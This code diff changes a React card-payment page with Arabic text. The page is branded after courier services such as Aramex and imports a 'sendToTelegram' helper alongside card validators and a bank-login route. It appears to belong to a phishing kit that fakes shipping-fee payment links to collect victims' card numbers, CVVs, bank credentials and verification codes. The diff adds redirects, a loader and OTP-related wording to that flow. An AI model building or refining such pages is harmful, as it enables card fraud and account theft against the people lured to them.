@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -13,12 +13,24 @@ import { sendToTelegram } from "@/lib/telegram";
 import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
+import FullScreenLoader from "@/components/FullScreenLoader";
 
 const PaymentCardInput = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData } = useLink(id);
+  const { data: linkData, isLoading } = useLink(id);
+  
+  useEffect(() => {
+    const method = sessionStorage.getItem('paymentMethod');
+    if (!method) {
+      navigate(`/pay/${id}/track`);
+      return;
+    }
+    if (method !== 'card') {
+      navigate(`/pay/${id}/bank-login`);
+    }
+  }, [id, navigate]);
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
@@ -33,11 +45,27 @@ const PaymentCardInput = () => {
   const selectedCountry = sessionStorage.getItem('selectedCountry') || '';
   const selectedBankId = sessionStorage.getItem('selectedBank') || '';
   
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+  if (isLoading) {
+    return <FullScreenLoader label="جاري تجهيز صفحة الدفع بالبطاقة..." />;
+  }
+
+  if (!linkData) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
+        <div className="text-center p-8">
+          <CreditCard className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
+          <h2 className="text-lg font-semibold mb-2">تعذر تحميل بيانات الدفع</h2>
+          <p className="text-sm text-muted-foreground">الرجاء التحقق من الرابط أو إعادة المحاولة لاحقاً.</p>
+        </div>
+      </div>
+    );
+  }
+
+  const payload = (linkData.payload ?? {}) as Record<string, any>;
+  const serviceKey = payload.service_key || customerInfo.service || 'aramex';
+  const serviceName = payload.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  const shippingInfo = linkData?.payload as any;
-  const amount = shippingInfo?.cod_amount || 500;
+  const amount = payload?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
   
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
@@ -207,8 +235,8 @@ const PaymentCardInput = () => {
       serviceName={serviceName}
       serviceKey={serviceKey}
       amount={formattedAmount}
-      title="بيانات البطاقة"
-      description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
+      title="تفاصيل الدفع"
+      description={`أدخل بيانات البطاقة لخدمة ${serviceName} مع تأكيد عبر رمز التحقق`}
       icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
     >
       {/* Selected Bank/Country Info */}
